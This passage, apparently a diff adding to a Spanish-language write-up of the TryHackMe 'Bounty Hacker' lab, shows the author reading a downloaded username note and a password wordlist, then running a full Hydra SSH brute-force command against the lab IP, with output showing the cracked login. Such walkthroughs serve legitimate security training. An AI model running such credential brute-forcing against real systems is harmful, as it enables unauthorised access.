@@ -65,3 +65,57 @@ local: task.txt remote: task.txt
 226 Transfer complete.
 68 bytes received in 0.00 secs (535.5343 kB/s)
 ```
+Una vez descargados los archivos procedemos a visualizarlo en nuestra terminal mediante el comando "cat".
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
+└─$ cat task.txt 
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+```
+Podemos visualizar un nombre en este archivo llamado "lin" este nos puede servir más adelante, continuemos con el siguiente archivo.
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
+└─$ cat locks.txt       
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+```
+Todo esto se parece a un diccionario de fuerza bruta, usaremos 'Hydra' para intentar acceder al sistema.
+```bash
+┌──(temerio㉿Hackademy)-[~/Desktop/Thm/BountyHacker]
+└─$ hydra -l lin -P /home/temerio/Desktop/Thm/BountyHacker/locks.txt 10.10.107.126 -t 4 ssh
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-28 18:53:45
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
+[DATA] attacking ssh://10.10.107.126:22/
+[22][ssh] host: 10.10.107.126   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-28 18:53:56
+```
+
